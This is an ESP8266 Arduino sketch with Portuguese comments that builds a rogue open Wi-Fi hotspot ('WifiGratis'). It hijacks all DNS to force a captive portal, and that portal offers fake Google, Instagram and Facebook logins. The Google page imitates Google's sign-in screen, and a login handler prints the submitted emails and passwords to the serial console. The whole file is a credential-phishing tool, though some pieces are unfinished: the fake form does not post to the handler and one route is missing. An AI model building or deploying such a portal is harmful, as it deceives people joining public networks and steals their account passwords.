#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const char* ssid = "WifiGratis";
const char* password = "";

DNSServer dnsServer;
ESP8266WebServer webServer(80);

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  delay(100);

  // Configura o DNS server para redirecionar todas as requisições para o ESP8266
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Configuração da rota para a página inicial de seleção de login
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.on("/google", HTTP_GET, handleGoogle); // Rota para a página de login Google

  // Manipulação para servir a página inicial de seleção de login automaticamente
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", String("/"), true);   // Redireciona para a rota principal "/"
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
  Serial.println("Captive portal started");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  // Página HTML principal
  String html = "<!DOCTYPE html>"
                "<html lang='en'>"
                "<head>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                "<title>Autenticador Wi-Fi</title>"
                "<style>"
                "body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }"
                ".container { background-color: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); text-align: center; max-width: 400px; width: 100%; }"
                "h2 { color: #333; }"
                ".button-container { display: flex; flex-direction: column; align-items: center; }"
                ".social-button { margin: 10px 0; width: 80%; padding: 10px; border-radius: 5px; cursor: pointer; color: #ffffff; font-weight: bold; text-decoration: none; text-align: center; }"
                ".google { background-color: #db4437; }"
                ".instagram { background-color: #405de6; }"
                ".facebook { background-color: #1877f2; }"
                "</style>"
                "</head>"
                "<body>"
                "<div class='container'>"
                "<h2>WiFi Authenticator</h2>"
                "<div class='button-container'>"
                "<a href='/google' class='social-button google'>Login com Google</a>"
                "<a href='/social?platform=Instagram' class='social-button instagram'>Login com Instagram</a>"
                "<a href='/social?platform=Facebook' class='social-button facebook'>Login com Facebook</a>"
                "</div>"
                "</div>"
                "</body>"
                "</html>";

  webServer.send(200, "text/html", html);
}

void handleLogin() {
  // Manipulação do formulário de login (exemplo básico)
  String email = webServer.arg("email");
  String password = webServer.arg("password");
  Serial.print("Email entered: ");
  Serial.println(email);
  Serial.print("Password entered: ");
  Serial.println(password);
  webServer.send(200, "text/html", "<h1>Login successful</h1><p>You entered:</p><p>Email: " + email + "</p><p>Password: " + password + "</p>");
}

void handleGoogle() {
  // Página HTML de login Google
  String html = "<!DOCTYPE html>"
                "<html lang='en'>"
                "<head>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                "<title>Fazer login na conta Google</title>"
                "<style>"
                "body {"
                "    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;"
                "    box-sizing: border-box;"
                "}"
                ".container {"
                "  display: flex;"
                "  flex-flow: column;"
                "  width: 500px;"
                "  margin: auto; "
                "}"
                ".logo-block  {"
                "  width: 100px;"
                "  margin-left: auto;"
                "  margin-right: auto;"
                "  margin-top: 0px;"
                "  margin-bottom: 0px;"
                "}"
                ".title-block, .signin-block {"
                "  text-align: center;"
                "  margin: auto;"
                "  height: auto; "
                "}"
                ".login-title { "
                "  color: #555;"
                "  font-size: 36px;"
                "  font-weight: 400;"
                "  margin-top: 0px;"
                "  margin-bottom: 0px;"
                "}"
                ".login-text{"
                "  color: #555;"
                "  font-size: 18px;"
                "  font-weight: 400;"
                "}  "
                ".account-wall {"
                "   background-color: lightgrey;"
                "   width: 350px;"
                "   height: auto;"
                "   background-color: #f7f7f7;"
                "   -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);"
                "   -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);"
                "   box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);"
                "}"
                ".profile-img{"
                "    width: 96px;"
                "    height: 96px;"
                "    margin-top: 30px;"
                "    margin-bottom:25px;"
                "    -moz-border-radius: 50%;"
                "    -webkit-border-radius: 50%;"
                "    border-radius: 50%;"
                "}"
                ".form-signin .form-control {"
                "    width: 300px;"
                "    font-size: 16px;"
                "    padding: 10px;"
                "    -webkit-box-sizing: border-box;"
                "    -moz-box-sizing: border-box;"
                "    box-sizing: border-box;"
                "}"
                ".form-signin input {"
                "    margin-bottom: 15px;"
                "    border-radius: 4px;"
                "}"
                "#button1 {"
                "    width: 40%;"
                "    font-weight: 400;"
                "    text-align: center;"
                "    margin-bottom: 30px;"
                "    color: #fff;"
                "    background-color: #337ab7;"
                "    border-color: #2e6da4;"
                "    padding: 10px 16px;"
                "    font-size: 18px;"
                "    line-height: 1.3333333;"
                "    border-radius: 6px;"
                "    border: 1px solid transparent;"
                "}"
                ".new-account {"
                "    text-align: center;"
                "    display: block;"
                "    margin-top: 10px;"
                "    text-decoration: none;"
                "    color: #337ab7;"
                "}"
                "</style>"
                "</head>"
                "<body>"
                "<div class='container'>"
                "<div class='logo-block margin'>"
                "<img src='https://raw.githubusercontent.com/smartninja/wd1-exercises/master/lesson-3/img/google-logo.png' class='title-image' width='100px' alt='google logo'>"
                "</div>"
                "<div class='title-block'>"
                "<h1 class='login-title'>Fazer login na conta google</h1>"
                "</div>"
                "<div class='signin-block'>"
                "<h3 class='Fazer login'>Use sua Conta do Google</h3>"
                "<div class='account-wall'>"
                "<img class='profile-img' src='https://raw.githubusercontent.com/smartninja/wd1-exercises/master/lesson-3/img/anonymous.png' alt='profile picture'>"
                "<form class='form-signin'>"
                "<input type='text' class='form-control' placeholder='Email ou Telefone' required autofocus>"
                "<input type='password' class='form-control' placeholder='Digite sua senha' required>"
                "<button id='button1' type='submit'>Fazer login</button>"
                "</form>"
                "</div>"
                "</div>"
                "</div>"
                "</body>"
                "</html>";

  webServer.send(200, "text/html", html);
}
